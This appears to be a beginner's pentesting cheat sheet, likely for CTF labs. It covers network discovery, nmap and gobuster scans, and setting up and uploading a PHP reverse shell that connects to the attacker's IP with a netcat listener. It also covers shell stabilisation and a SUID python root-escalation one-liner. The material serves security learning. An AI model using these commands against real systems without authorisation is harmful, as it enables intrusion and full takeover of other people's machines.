
# 🛠️ Basic Pentesting Notes

---

## 🔍 Reconnaissance

### 🔧 Tool: `netdiscover`
- **Purpose:** Discover live IPs in the local network.
```bash
sudo netdiscover -r 192.168.1.0/24
```

### 🔧 Tool: `nmap`
- **Purpose:** Port scanning, service enumeration, OS detection.
```bash
sudo nmap -A -T4 192.168.1.10
```

---

## 📡 Scanning & Enumeration

### 🔧 Tool: `gobuster`
- **Purpose:** Discover hidden web directories and files.
```bash
gobuster dir -u http://10.10.203.245 -w /usr/share/wordlists/dirb/common.txt
```

---

## 🚪 Gaining Access

### 🔧 PHP Reverse Shell (Pentestmonkey)
- **Steps:**
  1. Download from: [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)
  2. Edit the IP and port (replace with your machine's IP, **not** the target):
     ```php
     $ip = 'YOUR_IP';
     $port = 4444;
     ```
  3. Upload the shell (e.g., `shell.php`) and trigger it from the browser.

### 🔧 Tool: `netcat`
- **Purpose:** Listen for incoming reverse shell.
```bash
nc -lvnp 4444
```

---

## ⚙️ Shell Stabilization

### 🔧 Why Stabilize?
- Raw shells often lack:
  - Arrow keys, tab-completion
  - Support for `nano`, `sudo`, `passwd`, etc.
  - Signal handling (like Ctrl+C)

### 🔧 How To:
In the reverse shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Then press:
```
Ctrl + Z
```
Run the following locally:
```bash
stty raw -echo; fg
export TERM=xterm
```

---

## ⬆️ Privilege Escalation

### 🔧 Finding SUID Binaries
- **SUID** files run with the permissions of their owner (often root).
```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

### 🔧 Example: `python` with SUID

Use GTFOBins technique if `python` is SUID:
- Reference: [https://gtfobins.github.io/gtfobins/python/#suid](https://gtfobins.github.io/gtfobins/python/#suid)

```bash
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
whoami
```
- If it returns `root`, escalation succeeded.

---
